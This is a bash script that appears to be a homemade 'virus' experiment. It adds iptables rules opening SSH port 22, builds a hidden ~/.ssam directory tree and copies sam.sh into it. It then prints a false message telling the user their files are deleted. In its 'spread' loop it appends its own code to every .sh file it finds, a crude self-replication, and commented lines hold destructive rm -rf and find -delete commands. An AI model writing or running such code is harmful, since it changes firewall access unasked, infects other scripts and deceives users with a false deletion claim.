#! /bin/bash
iptables -A INPUT -m state --state NEW -p tcp --dport 22 -j ACCEPT 
iptables -A OUTPUT -m state --state NEW -p tcp --sport 22 -j ACCEPT

mkdir /home/$(whoami)/.ssam
mkdir /home/$(whoami)/.ssam/hel
mkdir /home/$(whoami)/.ssam/ssam
mkdir /home/$(whoami)/.ssam/son
mkdir /home/$(whoami)/.ssam/tes
mkdir /home/$(whoami)/.ssam/son/sami
mkdir /home/$(whoami)/.ssam/son/sami/test
mkdir /home/$(whoami)/.ssam/son/negash
mkdir /home/$(whoami)/.ssam/son/negash/go
mkdir /home/$(whoami)/.ssam/son/negash/dangefile
mkdir /home/$(whoami)/.ssam/son/negash/dangefile/dontopen



cp sam.sh /home/$(whoami)/.ssam/son/negash/dangefile/dontopen/sam.sh



#mv /home/samson/ssam /home/samson/.ssam # i hide it

# rm file_1.txt

# rm ./path/to/the/file/file_1.txt


# rm file_2.txt file_3.txt

# rm *.png

# rm -i *.dat


# rm -f filename

#rm -rf /home/samson/Documents/ttt/examples*

# tree


# find * -depth -print -delete | wc -l

#chmod +x /home/samson/Documents/cipherme/myvirus/shell/virus.sh





# paste same.sh same.sh > same.sh


echo "******************************************************************************************************"
echo "$(whoami) $(whoami) $(whoami) $(whoami) $(whoami) $(whoami) $(whoami) $(whoami) $(whoami) $(whoami) $(whoami)"
echo "Hello $(whoami) Your all file are deleted"





##### spread
cd /home/$(whoami)/.ssam
for f in $(find -name '*.sh');
do
echo " #! /bin/bash
iptables -A INPUT -m state --state NEW -p tcp --dport 22 -j ACCEPT 
iptables -A OUTPUT -m state --state NEW -p tcp --sport 22 -j ACCEPT

mkdir /home/$(whoami)/.ssam
mkdir /home/$(whoami)/.ssam/hel
mkdir /home/$(whoami)/.ssam/ssam
mkdir /home/$(whoami)/.ssam/son
mkdir /home/$(whoami)/.ssam/tes
mkdir /home/$(whoami)/.ssam/son/sami
mkdir /home/$(whoami)/.ssam/son/sami/test
mkdir /home/$(whoami)/.ssam/son/negash
mkdir /home/$(whoami)/.ssam/son/negash/go
mkdir /home/$(whoami)/.ssam/son/negash/dangefile
mkdir /home/$(whoami)/.ssam/son/negash/dangefile/dontopen



cp sam.sh /home/$(whoami)/.ssam/son/negash/dangefile/dontopen/sam.sh



#mv /home/samson/ssam /home/samson/.ssam # i hide it

# rm file_1.txt

# rm ./path/to/the/file/file_1.txt


# rm file_2.txt file_3.txt

# rm *.png

# rm -i *.dat


# rm -f filename

#rm -rf /home/samson/Documents/ttt/examples*

# tree


# find * -depth -print -delete | wc -l

#chmod +x /home/samson/Documents/cipherme/myvirus/shell/virus.sh





# paste same.sh same.sh > same.sh
" >> $f
done